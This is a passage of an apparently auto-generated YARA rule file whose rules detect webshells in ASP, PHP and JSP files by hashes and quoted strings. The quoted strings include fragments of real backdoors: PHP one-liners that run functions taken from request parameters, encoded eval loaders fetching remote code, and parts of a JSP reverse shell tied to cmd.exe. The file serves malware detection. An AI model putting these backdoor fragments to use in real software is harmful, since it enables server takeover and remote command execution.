      $s15 = "        String username = request.getParameter(\"username\");" fullword ascii
      $s16 = "        String ex=\".txt\";" fullword ascii
      $s17 = "    <p>url:<input type=\"text\" name=\"url\" value=\"<%=request.getParameter(\"url\")%>\"/></p>" fullword ascii
      $s18 = "  <p>table_name:<input type=\"text\" name=\"table_name\" /></p>" fullword ascii
      $s19 = "        String url = request.getParameter(\"url\");" fullword ascii
      $s20 = "        String backupDir = request.getParameter(\"bak_path\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 8KB and
      8 of them
}

rule Expdoor_com_ASP {
   meta:
      description = "webshell - file Expdoor.com ASP.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "70683c988de5a60d5da1c2d520d5be2183a25a9597a684b56fc3feacada3e6c4"
   strings:
      $s1 = "href='http://www.expdoor.com' title=\"" fullword ascii
      $s2 = "<TITLE>Expdoor.com ASP" fullword ascii
      $s3 = "\">www.Expdoor.com</a>" fullword ascii
      $s4 = "response.write (\"<script>alert('" fullword ascii
      $s5 = "<form method=\"post\" action=\"?action=set\">" fullword ascii
      $s6 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword ascii
      $s7 = "!')</script>\")    '" fullword ascii
      $s8 = "  <textarea name=\"Text\" cols=\"50\" rows=\"10\" id=\"Text\">" fullword ascii
      $s9 = "  </label><br><font color=red>" fullword ascii
      $s10 = "  <label> " fullword ascii
      $s11 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword ascii
      $s12 = "file.writeline Text                                        '" fullword ascii
      $s13 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" maxlength=\"50\" />" fullword ascii
      $s14 = "file.close                                                 '" fullword ascii
      $s15 = "  <label>" fullword ascii
      $s16 = "  </label>" fullword ascii
      $s17 = "  <br />" fullword ascii
   condition:
      uint16(0) == 0x543c and filesize < 4KB and
      8 of them
}

rule webshell_php_ucen {
   meta:
      description = "webshell - file ucen.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9e7efa4b3304eb87ee24952bfc1d5ab7a175d3df658fe09a7dbbf46cfff55ba9"
   strings:
      $x1 = "<?=eval(\"?>\".base64_decode(\"PD9waHANCi8qDQoJQXV0aG9yOiAJU29sZXZpc2libGUvQWxmYS1UZWFtDQoJVGVsZWdyYW06IAlodHRwczovL3RlbGVncmFtL" ascii
      $s2 = "PjxkaXYgc3R5bGU9J21hcmdpbi1sZWZ0OjIwcHg7Jz48YnV0dG9uIGNvbF9rZXk9JyIrbCsiJyBrZXk9JyIrcisiJyB0YmxfbmFtZT0nIitvKyInIGRiX2lkPSciK2kr" ascii /* base64 encoded string '><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+' */
      $s3 = "cW1JY0FERUNlbXJwd2NqMGZNQzhweXJ6MFoyOUlZeTdMV05uTFp4dEpBYTltcWRpVWNDK0hsM2hvaVlQUHlZVFpEb0hEbFppcmdMYWoxSU9Hc0ptd0twTWdoamxMSzNG" ascii /* base64 encoded string 'qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3F' */
      $s4 = "Z2V0RWxlbWVudHNCeUNsYXNzTmFtZSgic3ViLWJveCIpO2ZvcihpPTA7aTxhLmxlbmd0aDtpKyspYVtpXS5zZXRBdHRyaWJ1dGUoIm9wdF9pZCIsZSksYVtpXS5hZGRF" ascii /* base64 encoded string 'getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addE' */
      $s5 = "aXNhYkFnQTROZTVMMStGYnpTSXB5b1ZwYU0wZGhPTUVIQ1RpbXRtRzQ1RUZaam1aRVJITVhaUlA1RjBVMm9EUjByeitGeThucE1iR1FUZnlmUG9uTzZ6OWFxMTRQbVhE" ascii /* base64 encoded string 'isabAgA4Ne5L1+FbzSIpyoVpaM0dhOMEHCTimtmG45EFZjmZERHMXZRP5F0U2oDR0rz+Fy8npMbGQTfyfPonO6z9aq14PmXD' */
      $s6 = "ZWxzZSBzLnN0eWxlLmRpc3BsYXk9Im5vbmUifX12YXIgeT1lLmNsaWVudFgsXz1lLmNsaWVudFk7YWxmYVJpZ2h0Q2xpY2tNZW51KHksXyksZS5wcmV2ZW50RGVmYXVs" ascii /* base64 encoded string 'else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefaul' */
      $s7 = "M3B4fSNhZGR1cCwuYnV0dG9ue291dGxpbmU6bm9uZTtjdXJzb3I6cG9pbnRlcjtib3JkZXI6MXB4IHNvbGlkICNkOTE0OWE7YmFja2dyb3VuZDp0cmFuc3BhcmVudDti" ascii /* base64 encoded string '3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #d9149a;background:transparent;b' */
      $s8 = "Z2luLWxlZnQ6MTBweH0ucGFnZXMtaG9sZGVyIC5wYWdlcy1udW1iZXIgYS5wYWdlLW51bWJlcntwYWRkaW5nOjVweDtiYWNrZ3JvdW5kOiMwZjMwNGE7bWFyZ2luLXJp" ascii /* base64 encoded string 'gin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-ri' */
      $s9 = "bmNsaWNrPSJlZGl0b3IoXCcnK3MrIicsICdyZW5hbWUnLCcnLCcnLCcnLCdmaWxlJylcIj5SPC9hPiA8YSBpZD1cImlkX3RvdWNoXyIrcisnIiB0aXRsZT0iTW9kaWZ5" ascii /* base64 encoded string 'nclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify' */
      $s10 = "RCtQRlVmOVhrdllTcG5lMmpMNzNsWjhoMDQrU3VJbEUvVk8zMWg0dUtnQ1hSUUxHOWNROEk4VlhkNS9nREpaSElKVUF6cW8xN1hCSk1KZi9EamI2UTJTUWEwLzRMRHBZ" ascii /* base64 encoded string 'D+PFUf9XkvYSpne2jL73lZ8h04+SuIlE/VO31h4uKgCXRQLG9cQ8I8VXd5/gDJZHIJUAzqo17XBJMJf/Djb6Q2SQa0/4LDpY' */
      $s11 = "R2tDMkQwWkhBdy91elFDQ3hGYmlOZ1c2OENhUWFGcS95S1VzdEkydVIyRFdXTWp3ajA1cURYT3doZEFKWVNDSlFTejZCYVJtOSszOHE3dllrOTRjUll1cFhHNCtIWjFQ" ascii /* base64 encoded string 'GkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1P' */
      $s12 = "IjxhIG9uY2xpY2s9XCJnKCdGaWxlc01hbicsJyIrcitsW2ldKyIvJyk7XCIgcGF0aD0nIityK2xbaV0rIi8nIGhyZWY9JyNhY3Rpb249ZmlsZW1hbiZwYXRoPSIrcits" ascii /* base64 encoded string '"<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l' */
      $s13 = "OnRydWUsb3Blbl9pbnZvaWNlczp0cnVlLGFjdGl2aXR5X2xvZzp0cnVlfGluY29tZV9vdmVydmlldzp0cnVlLHN5c3RlbV9vdmVydmlldzp0cnVlLHdobWNzX25ld3M6" ascii /* base64 encoded string ':true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:' */
      $s14 = "YW4+In12YXIgeT1kLnF1ZXJ5U2VsZWN0b3IoIiMiK2kpO3kucXVlcnlTZWxlY3RvcigiLm15c3FsLXNlYXJjaC1hcmVhIikuaW5uZXJIVE1MPW4seS5xdWVyeVNlbGVj" ascii /* base64 encoded string 'an>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelec' */
      $s15 = "cntwb3NpdGlvbjphYnNvbHV0ZTt0b3A6NDAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGUoLTUwJSwtNTAlKTtiYWNrZ3JvdW5kOiMxZjFlMWVkYjtoZWlnaHQ6" ascii /* base64 encoded string 'r{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:' */
      $s16 = "LTEwcHgpfTgwJXstd2Via2l0LXRyYW5zZm9ybTp0cmFuc2xhdGVYKDEwcHgpfTEwMCV7LXdlYmtpdC10cmFuc2Zvcm06dHJhbnNsYXRlWCgwKX19QGtleWZyYW1lcyBh" ascii /* base64 encoded string '-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes a' */
      $s17 = "MHB4KX02MCV7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTEwcHgpfTgwJXt0cmFuc2Zvcm06dHJhbnNsYXRlWCgxMHB4KX0xMDAle3RyYW5zZm9ybTp0cmFuc2xhdGVYKDAp" ascii /* base64 encoded string '0px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)' */
      $s18 = "UzhUMmg5MUt2eVFkUXVwNy9EdTBnTGY2OXdqdDlLd0NueVNhN2ZsTlVYMEJ4TFl0clRTTDdYMG9KRWsyRVZOckpqMXl1b25hTmYrVDNaOUkvV3RmVHJtdjlXdUhYdWwy" ascii /* base64 encoded string 'S8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2' */
      $s19 = "O3IrKyl7dmFyIG49JCgicGZvb3RlcnVwXyIrcik7biYmbi5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKG4pLHVwY291bnQtLX1pZigwPT11cGNvdW50JiZ1cGNvdW50Kyss" ascii /* base64 encoded string ';r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,' */
      $s20 = "ZScpIiksJChyKS5zZXRBdHRyaWJ1dGUoIm9uY2xpY2siLCJlZGl0b3IoJyIrYSsiJywnZWRpdCcsJycsJycsJycsJyIrcysiJykiKSwkKG4pLnNldEF0dHJpYnV0ZSgi" ascii /* base64 encoded string 'e')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("' */
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_server {
   meta:
      description = "webshell - file server.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6753a8a77907e697abf47d9be854d180aa163cd4c4730477914a6b5eeee267a6"
   strings:
      $s1 = "eval(getenv('HTTP_CODE'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_jspbd {
   meta:
      description = "webshell - file jspbd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "702fb236f525c348fcb3f95053b20a2df946db38e4d2b007a6314606c8f5cc46"
   strings:
      $x1 = "                Process proc = rt.exec(\"cmd.exe\");" fullword ascii
      $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
      $s3 = "String ipPort = request.getParameter(\"port\");" fullword ascii
      $s4 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
      $s5 = "// backdoor.jsp" fullword ascii
      $s6 = "if(ipAddress != null && ipPort != null)" fullword ascii
      $s7 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
      $s8 = "                Runtime rt = Runtime.getRuntime();" fullword ascii
      $s9 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
      $s10 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
      $s11 = "        public void run()" fullword ascii
      $s12 = "                        new StreamConnector(proc.getInputStream()," fullword ascii
      $s13 = "                                          proc.getOutputStream());" fullword ascii
      $s14 = "                                          sock.getOutputStream());" fullword ascii
      $s15 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
      $s16 = "                        new StreamConnector(sock.getInputStream()," fullword ascii
      $s17 = "<form method=\"post\">" fullword ascii /* Goodware String - occured 2 times */
      $s18 = "static class StreamConnector extends Thread" fullword ascii
      $s19 = "                BufferedReader isr = null;" fullword ascii
      $s20 = "                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule jsp_reverse {
   meta:
      description = "webshell - file jsp-reverse.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "edd2ea0252d53d4ef62d593c60e589f1710153f126cfead7523a7f99e7fa1a78"
   strings:
      $x1 = "                Process proc = rt.exec(\"cmd.exe\");" fullword ascii
      $s2 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
      $s3 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
      $s4 = "String ipPort = request.getParameter(\"port\");" fullword ascii
      $s5 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
      $s6 = "// backdoor.jsp" fullword ascii
      $s7 = "if(ipAddress != null && ipPort != null)" fullword ascii
      $s8 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
      $s9 = "// http://www.security.org.sg/code/jspreverse.html" fullword ascii
      $s10 = "                Runtime rt = Runtime.getRuntime();" fullword ascii
      $s11 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
      $s12 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
      $s13 = "        public void run()" fullword ascii
      $s14 = "                        new StreamConnector(proc.getInputStream()," fullword ascii
      $s15 = "                                          proc.getOutputStream());" fullword ascii
      $s16 = "                                          sock.getOutputStream());" fullword ascii
      $s17 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
      $s18 = "                        new StreamConnector(sock.getInputStream()," fullword ascii
      $s19 = "<form method=\"post\">" fullword ascii /* Goodware String - occured 2 times */
      $s20 = "static class StreamConnector extends Thread" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_make2 {
   meta:
      description = "webshell - file make2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39414ada992524a9c1887b0b193945eb6c8ce45a4cc511e7d1cafdcf84f0de91"
   strings:
      $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8\");if(empty($_SESSION['api'])) $_SESSION['api']" ascii
      $s2 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8\");if(empty($_SESSION['api'])) $_SESSION['api']" ascii
      $s3 = "687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067" ascii /* hex encoded string 'http://7shell.googlecode.com/svn/make.jpg' */
      $s4 = "ubstr(file_get_contents(sprintf('%s?%s',pack(\"H*\",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652" ascii
      $s5 = "a7067'),uniqid())),3649);@preg_replace(\"~(.*)~ies\",gzuncompress($_SESSION['api']),null);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_123 {
   meta:
      description = "webshell - file webshell-123.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ca14fae96ad40c8d93b9420a73e7f82c56f0043294028bc6720b269adf5a19b2"
   strings:
      $x1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36" ascii
      $s2 = "// url:http://www.weigongkai.com/shell/" fullword ascii
      $s3 = "QkEG8JFCvt1+3JLM/cB2/cBqBPjBeFwRR6Z+LHYhnokkRRjRm/HN33RH0+loGHwJ5vYLxDPMIIkZstVBRyPPH+rVHgFrwjfGI6nJroMGODUxvxDIdpmcuAHNhhgWOyhh" ascii
      $s4 = "7WzTnN4y/fwv3k9IL9HXL/TWaq5SqmXSZdy/KggeyeyTtDbUo2DDgz4LtiHbW5qiHYd7glxPRP+B8EUPQZ+Iot6ogo3XzZdJnwP9M/JTdKKzIsxBhcYl+KTQjUAnmJHO" ascii
      $s5 = "ny5bI2WN86BNOhoTZCQQtFtPoIVg5Ov5CMg6pMPJp/DOH5sWBZT5FD5aX59e+QTfF0QFSUe31M4R9E+PkOPtaX1DGxj6zh+qJGWDNb4guv/oPVZC8fULAswxLEPj8lC1" ascii
      $s6 = "5C6LZxg2pt14xx+rL3gYrsVqR+bhBYzzADyMCnaKx60NhpJ+iPGENU7bbO/J8ukej70jvYTWsb9PITfe/qy1y+Nth3ozIc7ojFnMF8Xy+mhCohV+VoPoStJFcI+oArZL" ascii
      $s7 = "a1GxfzXsnEYGlSbu08B4/GvfvLYaC8BRH8aZR90KxtK/NtOHz+wD/bQzVr8zuK5WckIul+ONJdSd6VmwDQDmSj4Z7w7ZfmAFdT7EYe2gd5vCNZ3tqagrAz6KOW5nZqFs" ascii
      $s8 = "rWP8CLPfcR15sQ209jxeJNECs1OEP5LogtbhlZlaWauwNg50yc+EfMSN63iom7wd7rscZ93+ga89b/2BHBT+sP9r6+/MjVOhGOCfKbcofqXB4fkvkVeY10bQoRwri/s/" ascii
      $s9 = "LFseJgcG4S79wNo8AJwc0njJFsrf93E8rbOiBjwmTj6bswbzU+SLCdDlLR14SBv0cN4PyAXHJh7N8E5zA/RA/a/CGH1VgHly+TcoDgUT58aCv4dvfW2asGYQfpiP1efQ" ascii
      $s10 = "7ASpGpr1lIRc7Zqh6BZRtFFXmKpdyzh5D4WGytCY9kc6sVN4MYFfXVImeN/v9+FpGAYAg6P3hgUcVmGMGEXFyfvRmKTCXLVmxjGIUYTl/T57GnhLkunkcln93dpQgkTO" ascii
      $s11 = "BvK37uFtzOJ9PDx2m7lIG/h1J+XJqGett6rwjUv6alTsiQ7cdVDH85t1vodt9sz20o0hEGvMPQ9cw/j1OtOpK2hr1Na1BXY/2NPanZB9o2Knef8Aesadf72DnM0f2Lqg" ascii
      $s12 = "Z1XW7zl75tCzGuu3xJ4dsGesvTI9sxhe6qy9GnvG8NJg7TXZM4aXJmuvw54xvFzSs8I9PbtjMF9SH4UIe8ZgLlEfhTh7xmC+qrIrc+S5Y3SKV9pieuti36j2zDaDxWS4" ascii
      $s13 = "RduZVPKa0q1SCuaBztMsY6rWAqbajuUcNZ980DNuWvwBXmmP6X1X4IqVRm0YZ0fgY0hpQu9UaBPwAniOmHR1g5mS28BUrHHAz127VbLoigCzMm23+rd4jVsnXhldVyu3" ascii
      $s14 = "cgDFO17unxmzjTxd0s3xwvKaDbgPbCmdJ++2htmpMchOm3ep6VUjMr5YalZxmYh2bX6OedD7vWAuQA8ZzDtN9+y95+fMMtpFubPpHJg3j+Vh5y4iwdGZXzf1uSfHVs99" ascii
      $s15 = "kchv8A2+WAXSdV4rqE+t1Had16Ru3TzVhmlr1kxfBcJrhpfY0JJWr1wozmyMsdbQwIpKCFRp3XAPfHjntzAsNsRwGNHCmDNonONjtuO4s0HPZscRmBKKHs0bJHK2qUTV" ascii
      $s16 = "o35ambQGbdPnNWPrsfFA+TjAyuDl7SPukhzWEbUJYwQb+J7gAlg09tePs1YOytBfKB+/P2S/0C7CwOqyv/AM4+LINrsjX8tMPz04pL+ZtMRbO3kum1+tzLdv7pNr6IZ+" ascii
      $s17 = "ZzjtMFgs9ozhtMPGNmLPGE5VNrYJe7Zg88bam7Fnh2zeWHtsHDYbh8baY+Ow2Th01h4bh83GYbD23vB0ykCjYo0CrzpLA/ZSyQKOb5hLnP8XzS/jyxIfySei3WZjqTYv" ascii
      $s18 = "20ZusevyjR2lkbqoZ6voIyH7HV134qOyo4Q2DuRxTcLtj/i5wPpx+DaixeNvDyOJ+JvYbUKPq2+SyUQkcmDEu12jG4u8u7Sb84voQ/Y0P7/oHTas4mH8anHnWLFqZjqv" ascii
      $s19 = "8mt/PWfZBRazqZr31ldruNxUg7/xlVb1oWn7md7KK18F7bYX5JH+N/7S0N+m4vzVSnngrLo63VCDvVxXZ3Mv5nq4GAffXAdebqhDza2vsXFEzA3xOJRSoTVtCKGwpqav" ascii
      $s20 = "v+DlDKDTbSj4MfZ5j+9TRXax5scoMHwq80UhUlEtUKy3wxzBCu3w/hJmVAraAdcKuA2CKvvJe9BEFVIbjsMgiUxSE9Uu6FmzqXEkaXXrzQDQ3EGDI2U1chSGpoM7lmxL" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2022_08_26_04 {
   meta:
      description = "webshell - file 2022-08-26-04.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e481c336111aadb602c8ad8b25631f368d9f02057529e5d9a26fc991455f7fc0"
   strings:
      $s1 = "<?php ($_GET['p']=='_'?$_GET['f']($_GET['a']):y);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_08_26_03 {
   meta:
      description = "webshell - file 2022-08-26-03.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1784660bca992ca27892b7109484da2d146d5f219fd179d6fff9c3a86381d6d6"
   strings:
      $s1 = "<?php $_GET['p']=='_'&&$_GET['f']($_GET['a']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_kyo {
   meta:
      description = "webshell - file kyo.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4afafc7b59d74dc0ba6b61f0f0a0727603832f0cd6dfe4b4b1c4bb03d00c6786"
   strings:
      $s1 = "yqtUB1VqBecRun8tcHoogDpeBB7vkzGxQmZpFSRRSw6f2olYh29A1c4iCnnbf9WtBZTZyPl/lTPKr1xxbJmRc3MYAEzk8WQ4DY5C+x9xWI9ib+ZwWhMjpMUSdCh8FoHc" ascii
      $s2 = "5IdpiOq3jSd43/eXe1lomYaf+rVxytfi84ZVa0AVOhRD96RW12FfVaEpWDPRsZpk53jIHL4u/DHnfyHG6/or7AcEyc0TPmTk+lAkoVD63fXc7wo74egP8c+7EsTOhmlQ" ascii
      $s3 = "qXhCJMeuS43GlavJ/Qyr18fXZWsYGPr/16xEPHS9DTNJp7FRLSysA0QKI1uzMExH5yy45NWaGS2UBHgqry9snr6k26OptRiMt0IjUBGzalH/3K9MNoghle0lUTW9i08I" ascii
      $s4 = "9wmZ8HvrCsbvEpFS9CuP+yBcrPorFV/g1E4a45zneyOOu4/nCXnHGb1TdCVuMgLFTI8HcOJiO5HBTX5BsEDMOFFjfagGCuY7N+ChnIl7rmB1rQzlgabDixCL009RuWOE" ascii
      $s5 = "XMgp6DcoaByGv0eEQEjI14J98DITyCs0i4bdhjL117qk299JGicGiOnbRxOtlfqYSz9nZM0u9H8zigoMkDmCi/cXCBp+VYUkKBjmGDhJUp33MB5qsmnGuJiTo6qBTzNn" ascii
      $s6 = "b+nev+K5Y2QCPIOBNjP8ngsmYptIwxoEK/r/+ksTSvRs0f9vY8Gg0nLDHfHgFTB+TvLttQpLTxiFIBxvpxFA6wIs6RUc79/WC6/XsTfPPda/QLIywsKMP5ZdIbdqxJeQ" ascii
      $s7 = "7iSqlD8kvB7iNwr4fDxbgeAGKGKR2tjLv7xJt+ZqtJu9ekGkh1BTRwJK8G/uMWgQ9ywvSOsLtNPn9DS2mjy0g6oo8v76he+TPm1z+1KcpSXPJ+QCQUKX5tBjETZB8fH5" ascii
      $s8 = "csCV0NVrdk8RqlbtXhYdYh0f7Qq6+bPvqx4t4svRK8UA+7nS/gljpr8yfxlx9/1es0HDI2It4FO3PuoYxanmfNRaOs4hs4ArWCJ2VETLWOp8HKxFCrQvHaIXNupPF0v+" ascii
      $s9 = "Ji+ilryDxBwlWysZKuvI0ce446vzCwKHcVkjmPbf+hUX6XsH4GHwI1Kj+3Yxu/Mk9dDb1bF1RjYXwl+NMUDjGxS8X9TdO+CllHM8QaXWoGfM/SFd/cG7I3yj1DflmSbD" ascii
      $s10 = "WgKXH59a9GSxWYN+/d7falGs8tqicHrI29xNAX/ggQ5U05K0uq+qm2jfURp2kUFX6Pm5emM4dfAxhi0bjmBGLGTM+/jHm3tR1N9qNpr52rITd+MjoAEch8TS4kakGmFQ" ascii
      $s11 = "yaQ+xGOKgotQ1bVVkyENwG89H0RwmOWUrnXeEh8mWJKUzlAS5Lm6oe4ohWgTD4SFadJWhsJtSzbdzOdiHVHYl5ckGXp5G9TEZ2sEwahaVZg3MOjT/Kqkk96BClCUfHF+" ascii
      $s12 = "yXp8GPyoLtz+PgpaxSd2qIxechuVO91wWmueBktH0Q3irybaru0Mx0Xh4NKr/Xv+R/NIV+DIbRckKX44XUskz0sz0cpOS7Ky5JnEou5AhBLuMA/QlSP4ORpcCYurrN3W" ascii
      $s13 = "McXZ3KYZnN+llGGbMDWBILU3MIjf/+u368p2SJ80jVZEp5e60VfmO+itqhHih72iU43PLwC3XBqkiO5KAG46XSTAZdVZtMM353DTpQK2OfPPrk7WhEvqZdOB3R4+UVnD" ascii
      $s14 = "0zSPsF5OvmR9JCXvuqN+IFUKDsghOihB5UIhqIpymCKfbEOo7EUFFhJN6CLOdCJ0UobMNIdqJ0FcRTdsQwp0IzRShuQ3BpVveuawpxjkfRcMNi3HmMQGdnOOP+1U31Xk" ascii
      $s15 = "3QHs8TcPevAZWr2lQJ3778OzVo6U5G9UCciqjYY2/O9WFPI5o/gF/R/dg1UPeN4upMLH94AZz6xK9GBWAdaQZRxi0y6ZDipLSLIfyJu1KKCWqCDwuQpR1Yt2Rwydleei" ascii
      $s16 = "orgHjC7Ibe1/PvwbhCSZ0Z/7GP+v96Vw6ABqPiIA57I6YR8HRw1w9rQfYh0unJvGcCbNNpmkT1OOg6Gn3lYis0WUFItmbr4uEV57/W++Xnvpj38/Vi2+t26ecpMVv34J" ascii
      $s17 = "X6OSuClACl6tpS+hIP6xmfjUTESXS5R9JsTaQXAmBYTXiaUWMpJHvg0HcsQA92IGLjpnAd9fcTMl+aTJILJfZy92dVMC829nzbGm9prkLFpw7Lrc3PJ1BkhOrLOp84k5" ascii
      $s18 = "0QszGM9hkRCKbY4sOBhhBZcY09SmbTjaP0DxSj9KO1zbRF5GTYztH4Ktk7As38HyJS48CP6AEytbSiSyKO4KCMGYR81Fl9T2XZEifq10XCp7vrLpa6b7GzlJ9B+EWgB6" ascii
      $s19 = "Eyi235d+TZvfGfkPSSKj7rnl42t0h3H897yayPCzx/v/n3QIdYdWGd8v8hbkZFfrg5LwXRmxpLnL9svRc2FwmL2LvKvOxLc2qw0+l7FfyGhHHZ6LNPkJqozVaZlXM29A" ascii
      $s20 = "5tEo5GI0WbiQ8HB7enrykpCG/HA9iX2ng2obrWLhpFO18wf3QsV8yb0gI/CHpCXzO4BMim+Y/niNLiiPvAesEr1xwH6ffX7YVPlhxbokgyNRHhCfIZyYfa1XurVOjteg" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule webshell_jsp_k8cmd {
   meta:
      description = "webshell - file k8cmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3dc6ecb259bfbe4a6433806f5f262e4eedf8c9fac3d0a5e2de0cd89aed857666"
   strings:
      $s1 = "out.println(\"<div align='center'><form action='?act=login' method='post'>\");" fullword ascii
      $s2 = "<%!private String password=\"hehe\";//" fullword ascii
      $s3 = "out.println(\"<input type='password' name='pass'/>\");" fullword ascii
      $s4 = "}if(act.equals(\"login\"))" fullword ascii
      $s5 = "out.println(\"<input type='submit' name='update' class='unnamed1' value='Login' />\");" fullword ascii
      $s6 = "String content=request.getParameter(\"content\");" fullword ascii
      $s7 = "out.println(\"<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>\");" fullword ascii
      $s8 = "if(request.getSession().getAttribute(\"hehe\")!=null)" fullword ascii
      $s9 = "if (path!=null && !path.equals(\"\") && content!=null && !content.equals(\"\"))" fullword ascii
      $s10 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword ascii
      $s11 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%>" fullword ascii
      $s12 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
      $s13 = "out.println(\"<textarea name='content' rows=15 cols=50></textarea><br>\");" fullword ascii
      $s14 = "out.println(\"Error\");" fullword ascii
      $s15 = "String path=request.getParameter(\"path\");" fullword ascii
      $s16 = "String url=request.getRequestURI();" fullword ascii
      $s17 = "String url2=request.getRealPath(request.getServletPath());" fullword ascii
      $s18 = "{act=request.getParameter(\"act\").toString();}" fullword ascii
      $s19 = "    if(pass.equals(password))" fullword ascii
      $s20 = "out.println(\"<input type='submit' value='save!'>\");" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 6KB and
      8 of them
}

rule system1_jsp_ {
   meta:
      description = "webshell - file system1.jsp..jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "71dc3008254f4bac53d5c888c0883250d5a81404ff2c944835d19f80b9b83b74"
   strings:
